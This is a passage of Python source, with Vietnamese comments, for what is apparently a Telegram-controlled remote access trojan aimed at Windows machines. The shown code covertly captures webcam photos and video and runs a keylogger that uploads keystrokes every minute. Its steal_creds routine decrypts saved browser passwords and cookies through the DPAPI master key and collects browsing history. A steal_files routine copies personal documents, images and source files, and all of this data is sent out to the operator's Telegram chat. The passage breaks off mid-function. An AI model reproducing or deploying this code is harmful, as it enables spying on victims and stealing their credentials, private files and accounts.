            width, height = res_map[context.user_data['webcam_res']]
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)

            # Chụp ảnh
            ret, frame = cap.read()
            cap.release()

            if not ret:
                await query.edit_message_text("❌ Không thể chụp ảnh!")
                return

            # Áp dụng hiệu ứng
            frame = apply_effect(frame, context.user_data['webcam_effect'])

            # Chuyển đổi và gửi ảnh
            _, buffer = cv2.imencode('.jpg', frame)
            bio = BytesIO(buffer)
            bio.seek(0)
            await context.bot.send_photo(
                chat_id=chat_id,
                photo=bio,
                caption=f"📸 Ảnh từ webcam\n🖥 Độ phân giải: {context.user_data['webcam_res']}\n🎨 Hiệu ứng: {context.user_data['webcam_effect']}"
            )

        elif query.data == "webcam_video":
            if is_recording:
                await query.answer("🎥 Đang quay video!", show_alert=True)
                return

            async def record_video():
                global is_recording
                try:
                    is_recording = True
                    duration = context.user_data['webcam_duration']
                    res_map = {
                        '480p': (640, 480),
                        '720p': (1280, 720),
                        '1080p': (1920, 1080)
                    }
                    width, height = res_map[context.user_data['webcam_res']]
                    temp_video = os.path.join(TEMP_DIR, f"webcam_{int(time.time())}.mp4")
                    
                    cap = cv2.VideoCapture(context.user_data['webcam_id'], cv2.CAP_DSHOW)
                    if not cap.isOpened():
                        await context.bot.send_message(chat_id, "❌ Không thể kết nối webcam!")
                        return

                    # Thiết lập độ phân giải và FPS
                    cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
                    fps = 30
                    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                    out = cv2.VideoWriter(temp_video, fourcc, fps, (width, height))

                    start_time = time.time()
                    frames = 0
                    
                    while is_recording and time.time() - start_time < duration:
                        ret, frame = cap.read()
                        if not ret:
                            break

                        # Áp dụng hiệu ứng
                        frame = apply_effect(frame, context.user_data['webcam_effect'])
                        
                        out.write(frame)
                        frames += 1
                        await asyncio.sleep(1/fps)  # Đảm bảo FPS ổn định

                    cap.release()
                    out.release()

                    if os.path.exists(temp_video) and frames > 0:
                        # Gửi video
                        with open(temp_video, 'rb') as video:
                            await context.bot.send_video(
                                chat_id=chat_id,
                                video=video,
                                caption=f"🎥 Video từ webcam\n⏱ Thời gian: {duration}s\n🖥 Độ phân giải: {context.user_data['webcam_res']}\n🎨 Hiệu ứng: {context.user_data['webcam_effect']}"
                            )
                        os.remove(temp_video)
                    else:
                        await context.bot.send_message(chat_id, "❌ Lỗi khi quay video!")

                except Exception as e:
                    print(f"Lỗi khi quay video: {e}")
                    await context.bot.send_message(chat_id, f"❌ Lỗi: {str(e)}")
                finally:
                    is_recording = False
                    try:
                        cap.release()
                        out.release()
                    except:
                        pass

            webcam_task = asyncio.create_task(record_video())

        elif query.data == "webcam_timelapse":
            if is_recording:
                await query.answer("🎥 Đang ghi hình!", show_alert=True)
                return

            async def capture_timelapse():
                global is_recording
                try:
                    is_recording = True
                    duration = context.user_data['webcam_duration']
                    interval = 1  # Chụp mỗi giây
                    frames = []
                    
                    cap = cv2.VideoCapture(context.user_data['webcam_id'], cv2.CAP_DSHOW)
                    if not cap.isOpened():
                        await context.bot.send_message(chat_id, "❌ Không thể kết nối webcam!")
                        return

                    # Thiết lập độ phân giải
                    res_map = {
                        '480p': (640, 480),
                        '720p': (1280, 720),
                        '1080p': (1920, 1080)
                    }
                    width, height = res_map[context.user_data['webcam_res']]
                    cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)

                    start_time = time.time()
                    while is_recording and time.time() - start_time < duration:
                        ret, frame = cap.read()
                        if not ret:
                            break

                        # Áp dụng hiệu ứng
                        frame = apply_effect(frame, context.user_data['webcam_effect'])
                        frames.append(frame)
                        await asyncio.sleep(interval)

                    cap.release()

                    if frames:
                        # Tạo video từ các frame
                        temp_video = os.path.join(TEMP_DIR, f"timelapse_{int(time.time())}.mp4")
                        out = cv2.VideoWriter(temp_video, cv2.VideoWriter_fourcc(*'mp4v'), 10, (width, height))
                        
                        for frame in frames:
                            out.write(frame)
                        out.release()

                        # Gửi video
                        with open(temp_video, 'rb') as video:
                            await context.bot.send_video(
                                chat_id=chat_id,
                                video=video,
                                caption=f"⏱ Time-lapse video\n🕒 Thời gian: {duration}s\n📸 Số ảnh: {len(frames)}\n🖥 Độ phân giải: {context.user_data['webcam_res']}\n🎨 Hiệu ứng: {context.user_data['webcam_effect']}"
                            )
                        os.remove(temp_video)
                    else:
                        await context.bot.send_message(chat_id, "❌ Không có frame nào được chụp!")

                except Exception as e:
                    print(f"Lỗi khi tạo time-lapse: {e}")
                    await context.bot.send_message(chat_id, f"❌ Lỗi: {str(e)}")
                finally:
                    is_recording = False
                    try:
                        cap.release()
                    except:
                        pass

            webcam_task = asyncio.create_task(capture_timelapse())

        elif query.data == "duration_down":
            # Giảm thời gian quay
            context.user_data['webcam_duration'] = max(10, context.user_data['webcam_duration'] - 30)
            await query.answer(f"⏱ Thời gian quay: {context.user_data['webcam_duration']}s")
            
        elif query.data == "webcam_photo":
            # Chụp ảnh với các tùy chọn hiện tại
            cap = cv2.VideoCapture(context.user_data['webcam_id'], cv2.CAP_DSHOW)
            if not cap.isOpened():
                await query.edit_message_text("❌ Không thể kết nối webcam!")
                return
                return
            
            # Cấu hình webcam Full HD
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)
            cap.set(cv2.CAP_PROP_FPS, 60)
            cap.set(cv2.CAP_PROP_AUTOFOCUS, 1)
            cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 1)
            
            # Chụp nhiều frame để lấy ảnh tốt nhất
            frames = []
            for _ in range(5):
                ret, frame = cap.read()
                if ret:
                    frames.append(frame)
                await asyncio.sleep(0.1)
            
            cap.release()
            
            if not frames:
                await query.edit_message_text("❌ Không thể chụp ảnh!")
                return

            # Chọn frame sắc nét nhất
            best_frame = max(frames, key=cv2.Laplacian(cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY), cv2.CV_64F).var())
            
            # Xử lý ảnh nâng cao
            frame = cv2.fastNlMeansDenoisingColored(best_frame, None, 10, 10, 7, 21)
            frame = cv2.detailEnhance(frame, sigma_s=10, sigma_r=0.15)

            # Face detection
            face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
            gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
            faces = face_cascade.detectMultiScale(gray, 1.3, 5)
            
            # Vẽ khung face detect
            for (x,y,w,h) in faces:
                cv2.rectangle(frame, (x,y), (x+w,y+h), (255,0,0), 2)

            # Chuyển frame thành bytes chất lượng cao
            params = [cv2.IMWRITE_JPEG_QUALITY, 100]
            _, img_encoded = cv2.imencode('.jpg', frame, params)
            img_bytes = BytesIO(img_encoded.tobytes())

            await context.bot.send_photo(
                chat_id=query.message.chat_id,
                photo=img_bytes,
                caption="📸 Ảnh từ webcam"
            )
            await query.answer("✅ Đã chụp ảnh thành công!", show_alert=True)

        elif query.data == "webcam_video":
            if is_recording:
                await query.answer("Đang quay video!", show_alert=True)
                return

            async def record_video():
                global is_recording
                cap = None
                try:
                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                    if not cap.isOpened():
                        await query.edit_message_text("❌ Không thể kết nối webcam!")
                        return

                    # Cấu hình webcam chất lượng cao
                    width = 1920  # Full HD
                    height = 1080
                    fps = 60
                    cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
                    cap.set(cv2.CAP_PROP_FPS, fps)
                    cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))
                    cap.set(cv2.CAP_PROP_AUTOFOCUS, 1)
                    cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 1)

                    # Tạo video writer H.264 chất lượng cao
                    fourcc = cv2.VideoWriter_fourcc(*'avc1')
                    temp_video = 'temp_video.mp4'
                    video_writer = cv2.VideoWriter(temp_video, fourcc, fps, (width, height))

                    # Face detection
                    face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
                    
                    # Motion detection
                    previous_frame = None
                    motion_threshold = 30

                    start_time = time.time()
                    frame_count = 0
                    is_recording = True
                    
                    # Quay đủ 30 * fps frames để được video 30s
                    required_frames = 30 * fps
                    
                    while is_recording and frame_count < required_frames:
                        ret, frame = cap.read()
                        if ret:
                            # Motion detection
                            gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                            if previous_frame is not None:
                                diff = cv2.absdiff(previous_frame, gray)
                                if diff.mean() > motion_threshold:
                                    # Tăng độ sắc nét khi có chuyển động
                                    frame = cv2.detailEnhance(frame, sigma_s=10, sigma_r=0.15)
                            previous_frame = gray.copy()

                            # Face detection
                            faces = face_cascade.detectMultiScale(gray, 1.3, 5)
                            for (x,y,w,h) in faces:
                                cv2.rectangle(frame, (x,y), (x+w,y+h), (255,0,0), 2)

                            # Xử lý frame
                            frame = cv2.fastNlMeansDenoisingColored(frame, None, 10, 10, 7, 21)
                            
                            video_writer.write(frame)
                            frame_count += 1
                            
                            # Cập nhật tiến độ mỗi 30 frames (khoảng 1 giây với 30fps)
                            if frame_count % 30 == 0:
                                try:
                                    elapsed_seconds = frame_count // fps
                                    remaining_seconds = 30 - elapsed_seconds
                                    progress = (frame_count / required_frames) * 100
                                    
                                    await query.edit_message_text(
                                        f"🎥 Đang quay video...\n"
                                        f"Thời gian: {elapsed_seconds}/30s\n"
                                        f"Tiến độ: {progress:.1f}% ({frame_count}/{required_frames} frames)"
                                    )
                                except:
                                    pass

                        await asyncio.sleep(0.001)  # Giảm thiểu delay

                    is_recording = False
                    if cap:
                        cap.release()
                    video_writer.release()

                    # Gửi video
                    if os.path.exists(temp_video) and os.path.getsize(temp_video) > 0:
                        with open(temp_video, 'rb') as video:
                            await context.bot.send_video(
                                chat_id=query.message.chat_id,
                                video=video,
                                filename=f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4",
                                caption=f"🎥 Video từ webcam ({frame_count/fps:.1f}s)",
                                supports_streaming=True
                            )
                        os.remove(temp_video)
                        await query.edit_message_text(
                            f"✅ Đã gửi video thành công!\n"
                            f"Thời gian: {frame_count/fps:.1f}s ({frame_count} frames)"
                        )
                    else:
                        await query.edit_message_text("❌ Không thể tạo video!")

                except Exception as e:
                    await query.edit_message_text(f"❌ Lỗi: {str(e)}")
                finally:
                    is_recording = False
                    if cap and cap.isOpened():
                        cap.release()
                    try:
                        if os.path.exists(temp_video):
                            os.remove(temp_video)
                    except:
                        pass
                    cv2.destroyAllWindows()

            webcam_task = asyncio.create_task(record_video())
            await query.answer("Bắt đầu quay video...", show_alert=True)

        elif query.data == "stop_recording":
            if not is_recording:
                await query.answer("Không có video đang quay!", show_alert=True)
                return
                
            is_recording = False
            if webcam_task:
                try:
                    webcam_task.cancel()
                except:
                    pass
                webcam_task = None
            await query.answer("Đã dừng quay video!", show_alert=True)

    except Exception as e:
        await query.edit_message_text(f"❌ Lỗi: {str(e)}")

# Thêm hàm xử lý keylogger
@require_auth
async def keylogger_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("▶️ Bắt đầu", callback_data="start_logging"),
            InlineKeyboardButton("⏹ Dừng", callback_data="stop_logging")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔑 Điều khiển Keylogger:\n"
        "• Bắt đầu: Bắt đầu ghi và gửi log mỗi phút\n"
        "• Dừng: Dừng ghi log",
        reply_markup=reply_markup
    )

# Thêm hàm gửi log định kỳ
async def send_log_periodically(context: ContextTypes.DEFAULT_TYPE, chat_id: int):
    global key_logs, is_logging
    while is_logging:
        await asyncio.sleep(log_interval)
        if not is_logging:  # Kiểm tra lại sau khi đợi
            break
        if key_logs and any(log.strip() for log in key_logs):  # Chỉ gửi khi có log
            try:
                # Lọc bỏ các dòng trống
                filtered_logs = [log for log in key_logs if log.strip()]
                
                if filtered_logs:  # Kiểm tra lại sau khi lọc
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    log_text = "\n".join(filtered_logs)
                    log_bytes = BytesIO(log_text.encode('utf-8'))
                    
                    await context.bot.send_document(
                        chat_id=chat_id,
                        document=log_bytes,
                        filename=f"keylog_{timestamp}.txt",
                        caption="📝 Log phím trong 1 phút qua"
                    )
                    
                key_logs = [""]  # Reset log với một dòng trống
                
            except Exception as e:
                print(f"Lỗi khi gửi log: {e}")

# Sửa lại hàm xử lý các nút điều khiển keylogger
async def handle_keylogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_logging, key_logs, log_thread
    query = update.callback_query
    await query.answer()

    try:
        if query.data == "start_logging":
            if is_logging:
                await query.answer("Keylogger đang chạy!", show_alert=True)
                return

            is_logging = True
            key_logs = [""]  # Khởi tạo với một dòng trống
            log_thread = threading.Thread(target=start_keylogger)
            log_thread.start()
            asyncio.create_task(send_log_periodically(context, query.message.chat_id))
            await query.message.reply_text("✅ Đã bắt đầu ghi log")

        elif query.data == "stop_logging":
            if not is_logging:
                await query.answer("Keylogger đã dừng!", show_alert=True)
                return

            is_logging = False
            if log_thread and log_thread.is_alive():
                log_thread.join(timeout=1)
            
            # Gửi log cuối cùng nếu có nội dung
            if key_logs and any(log.strip() for log in key_logs):
                filtered_logs = [log for log in key_logs if log.strip()]
                if filtered_logs:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    log_text = "\n".join(filtered_logs)
                    log_bytes = BytesIO(log_text.encode('utf-8'))
                    
                    await context.bot.send_document(
                        chat_id=query.message.chat_id,
                        document=log_bytes,
                        filename=f"keylog_{timestamp}.txt",
                        caption="📝 Log phím cuối cùng"
                    )
                    
            key_logs = []  # Xóa toàn bộ log
            await query.message.reply_text("⏹ Đã dừng ghi log")

    except Exception as e:
        print(f"Lỗi keylogger: {e}")
        await query.message.reply_text(f"❌ Lỗi: {str(e)}")

# Thêm các hàm xử lý mã hóa và giải mã
def decrypt_blob(blob_out):
    """Giải mã giá trị từ DATA_BLOB"""
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def decrypt_windows_dpapi(encrypted_bytes, entropy=b''):
    """Giải mã dữ liệu được bảo vệ bằng DPAPI của Windows"""
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy))
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return decrypt_blob(blob_out)
    return None

def decrypt_browser_value(encrypted_value, master_key):
    """Giải mã giá trị được lưu trữ trong trình duyệt (mật khẩu/cookie)"""
    try:
        # Kiểm tra phiên bản mã hóa
        if isinstance(encrypted_value, bytes):
            # Kiểm tra xem có phải định dạng AES-GCM không
            if encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':
                iv = encrypted_value[3:15]
                payload = encrypted_value[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_value = cipher.decrypt(payload)
                # Bỏ 16 byte MAC ở cuối
                decrypted_value = decrypted_value[:-16]
                try:
                    return decrypted_value.decode()
                except UnicodeDecodeError:
                    return decrypted_value
            else:
                # Định dạng mã hóa khác hoặc không mã hóa
                return decrypt_windows_dpapi(encrypted_value)
    except Exception as e:
        print(f"Lỗi khi giải mã: {e}")
    return "<Không thể giải mã>"

def create_temp_db_copy(source_path, temp_dir):
    """Tạo bản sao tạm thời của tệp cơ sở dữ liệu để tránh khóa tệp"""
    rand_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(20))
    filename = os.path.join(temp_dir, f"{rand_name}.db")
    shutil.copy2(source_path, filename)
    return filename

def get_master_key(browser_path):
    """Lấy master key từ tệp Local State của trình duyệt"""
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        if not os.path.exists(local_state_path):
            print(f"Lỗi: File Local State không tồn tại tại {local_state_path}")
            return None
            
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
        except PermissionError:
            print(f"Lỗi: Không có quyền đọc file {local_state_path}")
            print("Vui lòng chạy với quyền administrator")
            return None
        except json.JSONDecodeError:
            print(f"Lỗi: File Local State không đúng định dạng JSON")
            return None
            
        try:
            encrypted_key = local_state["os_crypt"]["encrypted_key"]
        except KeyError:
            print("Lỗi: Không tìm thấy encrypted_key trong Local State")
            return None
            
        try:
            if not encrypted_key:
                print("Lỗi: encrypted_key trống")
                return None
                
            encrypted_key = b64decode(encrypted_key)
            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
            decrypted_key = decrypt_windows_dpapi(encrypted_key)
            if not decrypted_key:
                print("Lỗi: Không thể giải mã master key")
                return None
            return decrypted_key
            
        except Exception as e:
            print(f"Lỗi khi giải mã master key: {str(e)}")
            return None
            
    except Exception as e:
        print(f"Lỗi không xác định khi lấy master key: {str(e)}")
        return None

@require_auth
async def steal_creds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Thu thập thông tin đăng nhập, cookie, lịch sử và tải xuống từ trình duyệt"""
    try:
        await update.message.reply_text("🔍 Đang thu thập thông tin từ trình duyệt...")
        
        # Khởi tạo dữ liệu
        data = {
            'passwords': {'items': [], 'count': 0, 'domains': []},
            'cookies': {'items': [], 'count': 0},
            'history': {'items': [], 'count': 0},
            'downloads': {'items': [], 'count': 0}
        }
        
        # Tạo thư mục tạm thời
        temp_dir = os.path.join(TEMP_DIR, PC_NAME)
        os.makedirs(temp_dir, exist_ok=True)
        
        # Tìm các trình duyệt đã cài đặt
        browsers = detect_browsers()
        
        # Thu thập dữ liệu từ mỗi trình duyệt
        for browser_info in browsers:
            browser_path, has_profiles = browser_info
            
            try:
                # Lấy master key
                master_key = get_master_key(browser_path)
                if not master_key:
                    continue
                
                # Xác định các profiles cần quét
                profiles = get_browser_profiles(browser_path, has_profiles)
                
                # Xử lý từng profile
                for profile in profiles:
                    profile_path = get_profile_path(browser_path, profile, has_profiles)
                    
                    # Thu thập mật khẩu
                    collect_passwords(profile_path, master_key, data, has_profiles)
                    
                    # Thu thập cookie
                    collect_cookies(profile_path, master_key, data, has_profiles)
                    
                    # Thu thập lịch sử
                    collect_history(profile_path, data)
                    
                    # Thu thập lượt tải xuống
                    collect_downloads(profile_path, data)
                    
            except Exception as e:
                print(f"Lỗi khi xử lý trình duyệt {browser_path}: {e}")
        
        # Lưu kết quả vào các file
        save_results(data, temp_dir)
        
        # Tạo file tổng hợp
        create_summary(data, temp_dir)
        
        # Nén file
        zip_path = os.path.join(TEMP_DIR, PC_NAME)
        shutil.make_archive(zip_path, 'zip', temp_dir)
        
        # Gửi file
        await send_result_file(context, update.effective_chat.id, zip_path, data)
        
        # Dọn dẹp
        cleanup_temp_files(temp_dir, zip_path)
            
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi: {str(e)}")

def detect_browsers():
    """Phát hiện các trình duyệt đã cài đặt"""
    browsers = []
    for root in [LOCAL_APPDATA, os.getenv('APPDATA')]:
        for directory in os.listdir(root):
            try:
                for _root, _, _ in os.walk(os.path.join(root, directory)):
                    if "Local State" in os.listdir(_root):
                        if "Default" in os.listdir(_root):
                            browsers.append([_root, True])  # Có profile
                        elif "Login Data" in os.listdir(_root):
                            browsers.append([_root, False])  # Không có profile
            except Exception:
                pass
    return browsers

def get_browser_profiles(browser_path, has_profiles):
    """Lấy danh sách profiles của trình duyệt"""
    profiles = ["Default"]
    if has_profiles:
        for directory in os.listdir(browser_path):
            if directory.startswith("Profile "):
                profiles.append(directory)
    return profiles

def get_profile_path(browser_path, profile, has_profiles):
    """Lấy đường dẫn đến profile"""
    return browser_path if not has_profiles else os.path.join(browser_path, profile)

def collect_passwords(profile_path, master_key, data, has_profiles):
    """Thu thập mật khẩu từ profile"""
    try:
        login_db = os.path.join(profile_path, "Login Data")
        
        if not has_profiles:
            login_db = os.path.join(profile_path, "Login Data")
        
        if os.path.exists(login_db):
            temp_file = create_temp_db_copy(login_db, os.path.dirname(login_db))
            
            conn = sql_connect(temp_file)
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                if row[0]:
                    # Kiểm tra domain có trong danh sách từ khóa
                    for keyword in k3YW0rd:
                        domain = keyword
                        if "[" in keyword:
                            domain = keyword.split('[')[1].split(']')[0]
                        
                        if domain in row[0]:
                            if keyword not in data['passwords']['domains']:
                                data['passwords']['domains'].append(keyword)
                            
                            # Thêm vào danh sách mật khẩu
                            password = decrypt_browser_value(row[2], master_key)
                            data['passwords']['items'].append(f"URL: {row[0]} | Username: {row[1]} | Password: {password}")
                            data['passwords']['count'] += 1
                            break
            
            cursor.close()
            conn.close()
            os.remove(temp_file)
    except Exception as e:
        print(f"Lỗi khi thu thập mật khẩu: {e}")

def collect_cookies(profile_path, master_key, data, has_profiles):
    """Thu thập cookies từ profile"""
    try:
        # Xác định đường dẫn đến file cookies
        cookie_path = None
        try:
            if has_profiles:
                if "Network" in os.listdir(profile_path):
                    cookie_path = os.path.join(profile_path, "Network", "Cookies")
                else:
                    cookie_path = os.path.join(profile_path, "Cookies")
            else:
                if "Network" in os.listdir(profile_path):
                    cookie_path = os.path.join(profile_path, "Network", "Cookies")
                else:
                    cookie_path = os.path.join(profile_path, "Cookies")
        except PermissionError:
            print(f"Lỗi: Không có quyền truy cập thư mục {profile_path}")
            print("Vui lòng chạy với quyền administrator")
            return
            
        if not cookie_path or not os.path.exists(cookie_path):
            print(f"File cookie không tồn tại tại {cookie_path}")
            return
            
        # Tạo bản sao tạm thời trong TEMP_DIR
        try:
            temp_file = create_temp_db_copy(cookie_path, TEMP_DIR)
            if not temp_file:
                print(f"Không thể tạo bản sao tạm thời của file cookie")
                return
                
            try:
                conn = sql_connect(temp_file)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                
                for row in cursor.fetchall():
                    if row[2]:  # Chỉ xử lý nếu có encrypted_value
                        try:
                            cookie_val = decrypt_browser_value(row[2], master_key)
                            if cookie_val:
                                data['cookies']['items'].append(f"Host: {row[0]} | Name: {row[1]} | Value: {cookie_val}")
                                data['cookies']['count'] += 1
                        except Exception as e:
                            print(f"Lỗi khi giải mã cookie: {str(e)}")
                            continue
                            
                cursor.close()
                conn.close()
                
            except Exception as e:
                print(f"Lỗi khi truy vấn database cookie: {str(e)}")
                
            finally:
                try:
                    os.remove(temp_file)
                except:
                    pass
                    
        except PermissionError:
            print(f"Lỗi: Không có quyền truy cập file {cookie_path}")
            print("Vui lòng chạy với quyền administrator")
            
    except Exception as e:
        print(f"Lỗi không xác định khi thu thập cookies: {str(e)}")

def collect_history(profile_path, data):
    """Thu thập lịch sử duyệt web từ profile"""
    try:
        history_path = os.path.join(profile_path, "History")
        
        if os.path.exists(history_path):
            temp_file = create_temp_db_copy(history_path, os.path.dirname(history_path))
            
            conn = sql_connect(temp_file)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls")
            
            for row in cursor.fetchall():
                data['history']['items'].append(f"URL: {row[0]} | Title: {row[1]} | Last Visit: {row[2]}")
                data['history']['count'] += 1
            
            cursor.close()
            conn.close()
            os.remove(temp_file)
    except Exception as e:
        print(f"Lỗi khi thu thập lịch sử: {e}")

def collect_downloads(profile_path, data):
    """Thu thập lịch sử tải xuống từ profile"""
    try:
        history_path = os.path.join(profile_path, "History")
        
        if os.path.exists(history_path):
            temp_file = create_temp_db_copy(history_path, os.path.dirname(history_path))
            
            conn = sql_connect(temp_file)
            cursor = conn.cursor()
            cursor.execute("SELECT tab_url, target_path FROM downloads")
            
            for row in cursor.fetchall():
                data['downloads']['items'].append(f"URL: {row[0]} | Đường dẫn: {row[1]}")
                data['downloads']['count'] += 1
            
            cursor.close()
            conn.close()
            os.remove(temp_file)
    except Exception as e:
        print(f"Lỗi khi thu thập lịch sử tải xuống: {e}")

def save_results(data, temp_dir):
    """Lưu kết quả vào các file"""
    # Lưu mật khẩu
    with open(os.path.join(temp_dir, "passwords.txt"), "w", encoding="utf-8") as f:
        f.write(f"Tổng số mật khẩu: {data['passwords']['count']}\n")
        f.write(f"Các trang web: {', '.join(data['passwords']['domains'])}\n\n")
        f.write("Chi tiết mật khẩu:\n")
        for item in data['passwords']['items']:
            f.write(f"{item}\n")
    
    # Lưu cookies
    with open(os.path.join(temp_dir, "cookies.txt"), "w", encoding="utf-8") as f:
        f.write(f"Tổng số cookie: {data['cookies']['count']}\n\n")
        f.write("Chi tiết cookie:\n")
        for item in data['cookies']['items']:
            f.write(f"{item}\n")
    
    # Lưu lịch sử
    with open(os.path.join(temp_dir, "history.txt"), "w", encoding="utf-8") as f:
        f.write(f"Tổng số mục lịch sử: {data['history']['count']}\n\n")
        f.write("Chi tiết lịch sử:\n")
        for item in data['history']['items']:
            f.write(f"{item}\n")
    
    # Lưu lịch sử tải xuống
    with open(os.path.join(temp_dir, "downloads.txt"), "w", encoding="utf-8") as f:
        f.write(f"Tổng số lượt tải xuống: {data['downloads']['count']}\n\n")
        f.write("Chi tiết tải xuống:\n")
        for item in data['downloads']['items']:
            f.write(f"{item}\n")

def create_summary(data, temp_dir):
    """Tạo file tổng hợp"""
    with open(os.path.join(temp_dir, "summary.txt"), "w", encoding="utf-8") as f:
        f.write(f"===== THÔNG TIN THU THẬP ĐƯỢC =====\n\n")
        f.write(f"Tổng số mật khẩu: {data['passwords']['count']}\n")
        f.write(f"Tổng số cookie: {data['cookies']['count']}\n")
        f.write(f"Tổng số mục lịch sử: {data['history']['count']}\n")
        f.write(f"Tổng số lượt tải xuống: {data['downloads']['count']}\n\n")
        f.write(f"Các trang web tìm thấy: {', '.join(data['passwords']['domains'])}\n")

async def send_result_file(context, chat_id, zip_path, data):
    """Gửi file kết quả về Telegram"""
    with open(zip_path + ".zip", 'rb') as doc:
        await context.bot.send_document(
            chat_id=chat_id,
            document=doc,
            caption=f"📦 Đã thu thập được:\n"
                    f"- {data['passwords']['count']} mật khẩu\n"
                    f"- {data['cookies']['count']} cookie\n"
                    f"- {data['history']['count']} mục lịch sử\n"
                    f"- {data['downloads']['count']} lượt tải xuống"
        )

def cleanup_temp_files(temp_dir, zip_path):
    """Dọn dẹp các file tạm thời"""
    try:
        shutil.rmtree(temp_dir)
        os.remove(zip_path + ".zip")
    except Exception as e:
        print(f"Lỗi khi dọn dẹp file tạm: {e}")

@require_auth
async def steal_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command để thu thập file theo định dạng"""
    extensions = [
        # Hình ảnh
        '.png', '.jpg', '.jpeg', '.gif', '.bmp',
        # Video
        '.mp4', '.avi', '.mkv', '.flv', '.mov',
        # Audio
        '.mp3', '.wav', '.flac', '.ogg',
        # Tài liệu văn phòng
        '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
        # Văn bản
        '.txt', '.rtf', '.csv',
        # Tệp nén
        '.zip', '.rar', '.7z',
        # Mã nguồn
        '.py', '.java', '.cpp', '.c', '.cs', '.js', '.php', '.html', '.css'
    ]
    
    try:
        # Tạo thư mục tạm thời
        temp_dir = os.path.join(TEMP_DIR, "stolen_files")
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)
            
        status_message = await update.message.reply_text("🔍 Đang tìm kiếm các file...")
        total_files = 0
        copied_files = 0
        skipped_files = 0
        
        # Thu thập file từ các thư mục quan trọng với giới hạn kích thước
        max_file_size = 10 * 1024 * 1024  # 10MB
        important_dirs = ['Desktop', 'Documents', 'Downloads', 'Pictures']
        
        for dir_name in important_dirs:
            dir_path = os.path.join(os.path.expanduser("~"), dir_name)
            if os.path.exists(dir_path):
                try:
                    # Cập nhật trạng thái
                    await status_message.edit_text(
                        f"🔍 Đang quét thư mục {dir_name}...\n"
                        f"Đã tìm thấy: {total_files} file\n"
                        f"Đã sao chép: {copied_files} file\n"
                        f"Đã bỏ qua: {skipped_files} file"
                    )
                    
                    # Sử dụng os.walk với topdown=True để có thể bỏ qua thư mục
                    for root, dirs, files in os.walk(dir_path, topdown=True):
                        # Bỏ qua các thư mục hệ thống và ẩn
                        dirs[:] = [d for d in dirs if not d.startswith('.')]
                        
                        for file in files:
                            if any(file.lower().endswith(ext) for ext in extensions):
                                total_files += 1
                                try:
                                    src_path = os.path.join(root, file)
                                    # Kiểm tra kích thước file
                                    if os.path.getsize(src_path) <= max_file_size:
                                        dst_path = os.path.join(temp_dir, file)
                                        shutil.copy2(src_path, dst_path)
                                        copied_files += 1
                                    else:
                                        skipped_files += 1
                                except:
                                    skipped_files += 1
                                    continue
                                
                                # Cập nhật trạng thái sau mỗi 10 file
                                if total_files % 10 == 0:
                                    try:
                                        await status_message.edit_text(
                                            f"🔍 Đang quét thư mục {dir_name}...\n"
                                            f"Đã tìm thấy: {total_files} file\n"
                                            f"Đã sao chép: {copied_files} file\n"
                                            f"Đã bỏ qua: {skipped_files} file"
                                        )
                                    except:
                                        pass
                except Exception as e:
                    print(f"Lỗi khi quét thư mục {dir_name}: {e}")
                    continue
        
        if copied_files == 0:
            await status_message.edit_text("❌ Không tìm thấy file nào phù hợp!")
            shutil.rmtree(temp_dir)
            return
            
        await status_message.edit_text(
